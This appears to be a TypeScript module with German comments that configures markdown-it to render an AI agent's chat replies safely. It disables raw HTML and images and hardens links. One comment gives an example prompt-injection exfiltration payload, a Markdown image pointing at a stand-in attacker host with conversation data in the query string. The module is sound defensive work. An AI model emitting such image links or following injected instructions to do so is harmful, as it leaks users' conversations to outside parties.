import MarkdownIt from 'markdown-it'

// `html: false` ist entscheidend: markdown-it escaped fremdes HTML und validiert Links, bevor
// die erzeugte Ausgabe in der Chat-Blase per v-html gerendert wird.
const renderer = new MarkdownIt({ html: false, breaks: true, linkify: true })

// Bilder laedt der Browser ohne Klick: eine per Prompt-Injection eingeschleuste Antwort wie
// `![](https://angreifer.example/?d=...)` truege sonst Gespraechsinhalte nach aussen.
renderer.disable('image')

// Links verlassen die App in einem neuen Tab, ohne Zugriff auf window.opener, ohne Referrer und
// ohne dass die App fremde Ziele aus Modellantworten empfiehlt.
const renderLinkOpen = renderer.renderer.rules.link_open
  ?? ((tokens, index, options, _env, self) => self.renderToken(tokens, index, options))
renderer.renderer.rules.link_open = (tokens, index, options, env, self) => {
  tokens[index]!.attrSet('target', '_blank')
  tokens[index]!.attrSet('rel', 'noopener noreferrer nofollow')
  return renderLinkOpen(tokens, index, options, env, self)
}

export function renderAgentMarkdown(content: string) {
  return renderer.render(content)
}
